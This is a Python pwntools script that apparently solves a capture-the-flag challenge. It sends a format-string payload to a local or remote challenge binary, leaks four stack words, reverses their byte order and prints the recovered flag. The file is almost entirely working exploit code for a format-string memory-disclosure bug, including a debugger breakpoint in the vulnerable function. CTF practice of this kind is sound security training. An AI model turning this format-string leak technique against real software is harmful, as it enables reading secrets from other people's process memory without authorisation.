#!/usr/bin/env python
import pwn
import binascii

REMOTE_ADDR = "127.0.0.1"
REMOTE_PORT = "1337"

# specific to my terminal - st
pwn.context.terminal = ["st", "-e", "sh", "-c"]

swap_endianness = lambda x: int.from_bytes(x, "little").to_bytes(8, "big")

def get_challenge():
    if pwn.args.REMOTE:
        return pwn.remote(REMOTE_ADDR, REMOTE_PORT)
    elif pwn.args.GDB:
        chal = pwn.process("./chal")
        pwn.gdb.attach(chal, """
                b * vuln + 183
                c
                """)
        return chal
    else:
        return pwn.process("./chal")

chal = get_challenge()
chal.sendline(" ".join([f"%{i + 1}$016lx" for i in range(9,13)]))
print(chal.readline().decode())

fstr = chal.readline()
flag = b"".join(swap_endianness(binascii.unhexlify(i)) for i in fstr.split()).decode(errors="ignore")
flag = flag[:flag.index("}") + 1]

print(f"Found the flag: {flag}")
